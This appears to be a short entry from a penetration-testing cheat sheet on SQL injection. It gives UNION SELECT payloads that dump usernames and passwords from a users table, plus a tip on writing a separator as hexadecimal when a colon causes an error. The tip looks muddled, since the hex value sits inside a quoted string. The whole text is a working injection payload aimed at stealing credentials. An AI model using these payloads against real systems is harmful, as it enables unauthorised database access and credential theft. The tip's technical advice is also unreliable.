# Special case hexadecimal ":"  0x3a

## If there is an error trying to include ":" in for example this instruction:&#x20;

' union select NULL,group\_concat(username,';',password) from users-- -\
\
Try to use instead hexadecimal representation:\
\
' union select NULL,group\_concat(username,';0x3a',password) from users-- -
